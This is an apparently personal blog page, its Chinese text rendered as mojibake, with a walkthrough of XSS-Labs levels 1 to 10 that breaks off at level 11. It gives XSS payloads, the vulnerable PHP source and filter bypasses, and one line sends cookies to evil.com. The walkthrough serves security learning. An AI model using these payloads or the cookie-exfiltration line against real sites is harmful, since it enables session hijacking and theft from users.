<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS-Labs é€šå…³è¯¦ç»†ç¬”è®° - æˆ‘çš„ä¸ªäººåšå®¢</title>
    <link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../css/markdown.css">
</head>

<body>
    <div class="container">
        <header>
            <h1>æˆ‘çš„ä¸ªäººåšå®¢</h1>
            <nav>
                <span><a href="../index.html" class="no-underline">é¦–é¡µ</a></span>
            </nav>
        </header>

        <main>
            <div class="messages-list">
                <div class="messages-header">
                    <h3>XSS-Labs é€šå…³è¯¦ç»†ç¬”è®°</h3>
                    <a href="../index.html" class="btn">è¿”å›é¦–é¡µ</a>
                </div>

                <div class="message-item">
                    <div class="message-header">
                        <span class="username">æŠ€æœ¯åˆ†äº«</span>
                        <span class="time">2025-12-20</span>
                    </div>
                    <div class="message-content">
                        <div class="markdown-content">
                            <h1>ğŸ¯ XSSåŸºç¡€æ¦‚å¿µ</h1>
                            <h3>ä»€ä¹ˆæ˜¯XSSï¼Ÿ</h3>
                            <p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scriptingï¼‰ï¼Œç”±äºç¼©å†™ä¸CSSé‡å ï¼Œå› æ­¤é€šå¸¸è¢«ç§°ä¸º<strong>XSS</strong>ã€‚</p>
                            <h3>XSSèƒ½åšä»€ä¹ˆï¼Ÿ</h3>
                            <ul>
                                <li>çªƒå–ç”¨æˆ·å¯†ç </li>
                                <li>å®ç°æ— å¯†ç ç™»å½•</li>
                                <li>æ‰§è¡Œä»»æ„å®¢æˆ·ç«¯è„šæœ¬</li>
                                <li>åŠ«æŒç”¨æˆ·ä¼šè¯</li>
                                <li>é’“é±¼æ”»å‡»</li>
                                <li>æ¶æ„é‡å®šå‘</li>
                            </ul>
                            <h3>XSSä¸»è¦ç±»å‹</h3>
                            <ol>
                                <li><strong>DOMå‹XSS</strong> - é€šè¿‡ä¿®æ”¹DOMç»“æ„æ‰§è¡Œæ¶æ„è„šæœ¬</li>
                                <li><strong>å­˜å‚¨å‹XSS</strong> - æ¶æ„ä»£ç å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œå½±å“æ‰€æœ‰è®¿é—®è€…</li>
                                <li><strong>åå°„å‹XSS</strong> - æ¶æ„ä»£ç é€šè¿‡URLå‚æ•°åå°„ç»™å—å®³è€…</li>
                            </ol>
                            <p>åœ¨XSS-Labsä¸­ï¼Œæˆ‘ä»¬çš„ä¸»è¦ç›®æ ‡æ˜¯å¯»æ‰¾æ³¨å…¥ç‚¹ï¼Œåœ¨ç½‘ç«™ä¸Šæ‰§è¡Œä»»æ„Scriptè„šæœ¬ã€‚æœ¬æ–‡å°†ä»<strong>payloadæ„é€ </strong>å’Œ<strong>æºç åˆ†æ</strong>ä¸¤ä¸ªè§’åº¦æ·±å…¥æ¢è®¨æ¯ä¸ªå…³å¡ã€‚
                            </p>
                            <hr>
                            <h2>ğŸ¯ å…³å¡1-20è¯¦è§£</h2>
                            <h3>Level 1: åŸºç¡€åå°„å‹XSS</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¿™æ˜¯ä¸€ä¸ªåŸºäºGETè¯·æ±‚çš„ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥åœ¨URLåœ°å€æ ä¸­ç›´æ¥ä¿®æ”¹å‚æ•°å†…å®¹ã€‚</p>
                            <p>åœ¨<code>?name=</code>åé¢è¾“å…¥å¦‚ä¸‹è„šæœ¬ï¼š</p>
                            <pre><code class="language-html">&lt;script&gt;alert()&lt;/script&gt;</code></pre>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;name&quot;];
echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li><code>echo</code>é‡‡ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤</li>
                                <li>è¾“å…¥çš„JSè„šæœ¬ç›´æ¥è¾“å‡ºåˆ°HTMLä¸­</li>
                                <li>è¿™æ˜¯æœ€å…¸å‹çš„åå°„å‹XSSæ¼æ´</li>
                            </ul>
                            <p><strong>payloadå˜ä½“</strong>ï¼š</p>
                            <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;script&gt;document.cookie&lt;/script&gt;
&lt;script&gt;location.href='http://evil.com?cookie='+document.cookie&lt;/script&gt;</code></pre>
                            <hr>
                            <h3>Level 2: HTMLå®ä½“ç¼–ç ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>åœ¨inputæ ‡ç­¾ä¸­è¾“å…¥<code>&lt;script&gt;alert()&lt;/script&gt;</code>ï¼Œå‘ç°å†…å®¹è¢«è½¬ä¹‰ï¼š</p>
                            <pre><code class="language-html">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;
&lt;center&gt;
&lt;input name=keyword  value=&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</code></pre>
                            <p><strong>å…³é”®å‘ç°</strong>ï¼š<code>&lt;</code>å’Œ<code>&gt;</code>ç­‰å­—ç¬¦è¢«è¿›è¡Œäº†HTMLå®ä½“ç¼–ç ï¼Œå¯¼è‡´è„šæœ¬æ— æ³•ç›´æ¥æ‰§è¡Œã€‚</p>
                            <p><strong>ç»•è¿‡æ€è·¯</strong>ï¼šå°è¯•é—­åˆinputæ ‡ç­¾</p>
                            <pre><code class="language-html">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code></pre>
                            <p>é¡µé¢æºç å˜ä¸ºï¼š</p>
                            <pre><code class="language-html">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level2.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ç¬¬ä¸€å¤„è¾“å‡ºä½¿ç”¨äº†<code>htmlspecialchars()</code>å‡½æ•°è¿›è¡Œè½¬ä¹‰</li>
                                <li>ç¬¬äºŒå¤„è¾“å‡ºç›´æ¥ä½¿ç”¨<code>$str</code>ï¼Œå­˜åœ¨XSSæ¼æ´</li>
                                <li><code>htmlspecialchars()</code>åªè½¬ä¹‰<code>&amp;</code>, <code>&quot;</code>,
                                    <code>'</code>,
                                    <code>&lt;</code>, <code>&gt;</code>å­—ç¬¦
                                </li>
                            </ul>
                            <p><strong>payloadå˜ä½“</strong>ï¼š</p>
                            <pre><code class="language-html">&quot; onclick=alert() &quot;
&quot; onmouseover=alert() &quot;
&quot; autofocus onfocus=alert()</code></pre>
                            <hr>
                            <h3>Level 3: å•å¼•å·é—­åˆä¸äº‹ä»¶ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¾“å…¥<code>&lt;script&gt;alert()&lt;/script&gt;</code>æŸ¥çœ‹é¡µé¢æºç ï¼š</p>
                            <pre><code class="language-html">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;
&lt;center&gt;
&lt;input name=keyword  value='&lt;script&gt;alert()&lt;/script&gt;'&gt;</code></pre>
                            <p>å°è¯•é—­åˆinputæ ‡ç­¾ï¼š</p>
                            <pre><code class="language-html">'&gt;&lt;script&gt;alert()&lt;/script&gt;</code></pre>
                            <p>é¡µé¢æºç ï¼š</p>
                            <pre><code class="language-html">&lt;input name=keyword  value=''&gt;&lt;script&gt;alert()&lt;/script&gt;'&gt;</code></pre>
                            <p>å‘ç°ä¸¤å¤„éƒ½è¢«è½¬ä¹‰äº†ï¼Œä½†å•å¼•å·æœªè¢«è¿‡æ»¤ã€‚å°è¯•åˆ©ç”¨inputæ ‡ç­¾çš„å±æ€§ï¼š</p>
                            <pre><code class="language-html">' onclick=alert() '</code></pre>
                            <p>æ³¨å…¥æˆåŠŸï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
&lt;form action=level3.php method=GET&gt;
&lt;input name=keyword  value='".htmlspecialchars($str).&quot;'&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;&quot;;
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä¸¤å¤„éƒ½ä½¿ç”¨äº†<code>htmlspecialchars()</code>è¿›è¡Œè½¬ä¹‰</li>
                                <li>inputæ ‡ç­¾ä½¿ç”¨å•å¼•å·åŒ…è£¹valueå€¼</li>
                                <li>é€šè¿‡é—­åˆå•å¼•å·å¹¶æ·»åŠ äº‹ä»¶å¤„ç†å™¨ç»•è¿‡</li>
                            </ul>
                            <p><strong>å¸¸ç”¨JSäº‹ä»¶</strong>ï¼š</p>
                            <pre><code class="language-javascript">// é¼ æ ‡äº‹ä»¶
onclick        // é¼ æ ‡ç‚¹å‡»æ—¶è§¦å‘
onmouseover    // é¼ æ ‡åˆ’è¿‡æ—¶è§¦å‘
onmouseout     // é¼ æ ‡ç¦»å¼€æ—¶è§¦å‘
onmousedown    // é¼ æ ‡æŒ‰ä¸‹æ—¶è§¦å‘
onmouseup      // é¼ æ ‡æ¾å¼€æ—¶è§¦å‘
onmousemove    // é¼ æ ‡ç§»åŠ¨æ—¶è§¦å‘

// é”®ç›˜äº‹ä»¶
onkeydown      // é”®ç›˜æŒ‰ä¸‹æ—¶è§¦å‘
onkeyup        // é”®ç›˜æ¾å¼€æ—¶è§¦å‘
onkeypress     // é”®ç›˜æŒ‰ä¸‹å¹¶æ¾å¼€æ—¶è§¦å‘

// è¡¨å•äº‹ä»¶
onsubmit       // è¡¨å•æäº¤æ—¶è§¦å‘
onreset        // è¡¨å•é‡ç½®æ—¶è§¦å‘
onchange       // å…ƒç´ å€¼æ”¹å˜æ—¶è§¦å‘
onfocus        // å…ƒç´ è·å¾—ç„¦ç‚¹æ—¶è§¦å‘
onblur         // å…ƒç´ å¤±å»ç„¦ç‚¹æ—¶è§¦å‘

// é¡µé¢äº‹ä»¶
onload         // é¡µé¢å®Œå…¨åŠ è½½å®Œæˆåè§¦å‘
onunload       // é¡µé¢å…³é—­æˆ–åˆ·æ–°æ—¶è§¦å‘
onresize       // çª—å£å¤§å°æ”¹å˜æ—¶è§¦å‘
onscroll       // é¡µé¢æ»šåŠ¨æ—¶è§¦å‘</code></pre>
                            <hr>
                            <h3>Level 4: åŒå¼•å·è¿‡æ»¤ä¸æ ‡ç­¾ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¾“å…¥<code>&lt;script&gt;alert()&lt;/script&gt;</code>æŸ¥çœ‹é¡µé¢æºç ï¼š</p>
                            <pre><code class="language-html">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;
&lt;center&gt;
&lt;input name=keyword  value=&quot;scriptalert()/script&quot;&gt;</code></pre>
                            <p>å‘ç°<code>&lt;</code>å’Œ<code>&gt;</code>è¢«è¿‡æ»¤ï¼Œä½†åŒå¼•å·ä¿ç•™ã€‚å°è¯•äº‹ä»¶ç»•è¿‡ï¼š</p>
                            <pre><code class="language-html">&quot; onclick=alert() &quot;</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level4.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä½¿ç”¨<code>str_replace()</code>å‡½æ•°è¿‡æ»¤<code>&lt;</code>å’Œ<code>&gt;</code>å­—ç¬¦</li>
                                <li>ç¬¬ä¸€å¤„è¾“å‡ºä»ä½¿ç”¨<code>htmlspecialchars()</code>è½¬ä¹‰</li>
                                <li>ç¬¬äºŒå¤„è¾“å‡ºç›´æ¥ä½¿ç”¨è¿‡æ»¤åçš„å­—ç¬¦ä¸²</li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">&quot; onclick=alert() &quot;
&quot; onmouseover=alert() &quot;
&quot; autofocus onfocus=alert()</code></pre>
                            <hr>
                            <h3>Level 5: JavaScriptä¼ªåè®®ä¸å¤§å°å†™ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¾“å…¥<code>&lt;script&gt;alert()&lt;/script&gt;</code>å‘ç°è¢«è¿‡æ»¤ã€‚å°è¯•å¤§å°å†™æ··åˆï¼š</p>
                            <pre><code class="language-html">&lt;ScRiPt&gt;alert()&lt;/ScRiPt&gt;</code></pre>
                            <p>ä»ç„¶è¢«è¿‡æ»¤ã€‚å°è¯•å…¶ä»–æ ‡ç­¾ï¼š</p>
                            <pre><code class="language-html">&lt;img src=x onerror=alert()&gt;</code></pre>
                            <p>å‘ç°<code>on</code>è¢«è¿‡æ»¤ã€‚ä½¿ç”¨JavaScriptä¼ªåè®®ï¼š</p>
                            <pre><code class="language-html">&lt;a href=&quot;javascript:alert()&quot;&gt;click me&lt;/a&gt;</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä½¿ç”¨<code>strtolower()</code>å°†è¾“å…¥è½¬æ¢ä¸ºå°å†™</li>
                                <li>ä½¿ç”¨<code>str_replace()</code>æ›¿æ¢<code>&lt;script</code>ä¸º<code>&lt;scr_ipt</code></li>
                                <li>ä½¿ç”¨<code>str_replace()</code>æ›¿æ¢<code>on</code>ä¸º<code>o_n</code></li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">&lt;a href=&quot;javascript:alert()&quot;&gt;xss&lt;/a&gt;
&lt;iframe src=javascript:alert()&gt;
&lt;img src=x onerror=alert()&gt;
&lt;svg onload=alert()&gt;</code></pre>
                            <hr>
                            <h3>Level 6: å¤§å°å†™æ··åˆä¸åŒå†™ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>å°è¯•å¤§å°å†™æ··åˆï¼š</p>
                            <pre><code class="language-html">&lt;ScRiPt&gt;alert()&lt;/ScRiPt&gt;</code></pre>
                            <p>æˆåŠŸï¼è¯´æ˜å¤§å°å†™ç»•è¿‡æœ‰æ•ˆã€‚</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>è¿‡æ»¤äº†å¤šä¸ªå…³é”®è¯ï¼š<code>&lt;script</code>, <code>on</code>, <code>src</code>,
                                    <code>data</code>,
                                    <code>href</code>
                                </li>
                                <li>ä½†æ²¡æœ‰ä½¿ç”¨<code>strtolower()</code>ï¼Œå¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡</li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">&lt;ScRiPt&gt;alert()&lt;/ScRiPt&gt;
&lt;IMG SRC=x ONERROR=alert()&gt;
&lt;SVG ONLOAD=alert()&gt;
&lt;IFRAME SRC=javascript:alert()&gt;</code></pre>
                            <hr>
                            <h3>Level 7: åŒå†™è¿‡æ»¤ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¾“å…¥<code>&lt;script&gt;alert()&lt;/script&gt;</code>å‘ç°è¢«è¿‡æ»¤ã€‚å°è¯•åŒå†™ï¼š</p>
                            <pre><code class="language-html">&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str =$_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str2.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>ä½¿ç”¨<code>str_replace(&quot;script&quot;,&quot;&quot;,$str)</code>åˆ é™¤<code>script</code>å­—ç¬¦ä¸²
                                </li>
                                <li>åŒå†™å¯ä»¥ç»•è¿‡å•æ¬¡åˆ é™¤ï¼š<code>scrscriptipt</code> â†’ <code>script</code></li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;
&lt;imimgg src=x onerror=alert()&gt;
&lt;onerror&gt;alert()&lt;/onerror&gt;</code></pre>
                            <hr>
                            <h3>Level 8: HTMLå®ä½“ç¼–ç ä¸JavaScriptä¼ªåè®®</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¾“å…¥å„ç§payloadéƒ½è¢«è½¬ä¹‰ã€‚æŸ¥çœ‹é¡µé¢æºç å‘ç°ä½¿ç”¨äº†HTMLå®ä½“ç¼–ç ã€‚å°è¯•JavaScriptä¼ªåè®®ï¼š</p>
                            <pre><code class="language-html">javascript:alert()</code></pre>
                            <p>å‘ç°è¢«æ·»åŠ åˆ°<code>href</code>å±æ€§ä¸­ï¼Œä½†éœ€è¦HTMLå®ä½“ç¼–ç ï¼š</p>
                            <pre><code class="language-html">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace('&quot;','&amp;quot;',$str6);
echo '&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php 
echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>å¤šé‡è¿‡æ»¤æœºåˆ¶</li>
                                <li>è¾“å‡ºæ—¶ä½¿ç”¨<code>htmlspecialchars()</code>å’Œé¢å¤–çš„å¼•å·è½¬ä¹‰</li>
                                <li>å‹æƒ…é“¾æ¥å¤„ç›´æ¥è¾“å‡ºï¼Œä½†éœ€è¦HTMLå®ä½“ç¼–ç </li>
                            </ul>
                            <p><strong>HTMLå®ä½“ç¼–ç è¡¨</strong>ï¼š</p>
                            <pre><code class="language-html">&amp;#106; = j
&amp;#97;  = a
&amp;#118; = v
&amp;#97;  = a
&amp;#115; = s
&amp;#99;  = c
&amp;#114; = r
&amp;#105; = i
&amp;#112; = p
&amp;#116; = t
&amp;#58;  = :
&amp;#97;  = a
&amp;#108; = l
&amp;#101; = e
&amp;#114; = r
&amp;#116; = t
&amp;#40;  = (
&amp;#39;  = '
&amp;#88;  = X
&amp;#83;  = S
&amp;#83;  = S
&amp;#39;  = '
&amp;#41;  = )</code></pre>
                            <hr>
                            <h3>Level 9: URLæ£€æµ‹ç»•è¿‡</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>è¾“å…¥<code>javascript:alert()</code>å‘ç°éœ€è¦åŒ…å«åˆæ³•URLã€‚å°è¯•ï¼š</p>
                            <pre><code class="language-html">javascript://http://test.com%0aalert()</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace('&quot;','&amp;quot;',$str6);
echo '&lt;center&gt;
&lt;form action=level9.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php 
if(false===strpos($str7,'http://')){
    echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
}else{
    echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
}
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>æ£€æµ‹è¾“å…¥æ˜¯å¦åŒ…å«<code>http://</code>å­—ç¬¦ä¸²</li>
                                <li>ä½¿ç”¨<code>strpos()</code>å‡½æ•°è¿›è¡ŒURLéªŒè¯</li>
                                <li>å¯ä»¥é€šè¿‡JavaScriptæ³¨é‡Šç»•è¿‡</li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">javascript://http://test.com%0aalert()
javascript:http://test.com%0dalert()
javascript:http://test.com%0a%0dalert()</code></pre>
                            <hr>
                            <h3>Level 10: éšè—å­—æ®µæ“ä½œ</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>æŸ¥çœ‹é¡µé¢æºç å‘ç°éšè—çš„inputå­—æ®µï¼š</p>
                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_link&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;t_history&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;t_sort&quot; value=&quot;&quot;&gt;</code></pre>
                            <p>å°è¯•ä¿®æ”¹<code>t_sort</code>å‚æ•°ï¼š</p>
                            <pre><code class="language-html">?keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert()</code></pre>
                            <p>æˆåŠŸæ³¨å…¥ï¼</p>
                            <h4>æºç åˆ†æ</h4>
                            <pre><code class="language-php">&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str11 = $_GET[&quot;t_sort&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level10.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;</code></pre>
                            <p><strong>åŸç†è§£æ</strong>ï¼š</p>
                            <ul>
                                <li>æœ‰ä¸‰ä¸ªéšè—å­—æ®µï¼š<code>t_link</code>, <code>t_history</code>, <code>t_sort</code></li>
                                <li>åªæœ‰<code>t_sort</code>å¯ä»¥è¢«ä¿®æ”¹</li>
                                <li>è¿‡æ»¤äº†<code>&lt;</code>å’Œ<code>&gt;</code>å­—ç¬¦</li>
                                <li>é€šè¿‡é—­åˆåŒå¼•å·å’Œæ”¹å˜inputç±»å‹ç»•è¿‡</li>
                            </ul>
                            <p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
                            <pre><code class="language-html">&quot; type=&quot;text&quot; onmouseover=&quot;alert()
&quot; type=&quot;text&quot; onclick=&quot;alert()
&quot; type=&quot;text&quot; autofocus onfocus=&quot;alert()</code></pre>
                            <hr>
                            <h3>Level 11: Refererå¤´æ³¨å…¥</h3>
                            <h4>æ”»å‡»è¿‡ç¨‹</h4>
                            <p>æŸ¥çœ‹é¡µé¢æºç å‘ç°ï¼š</p>
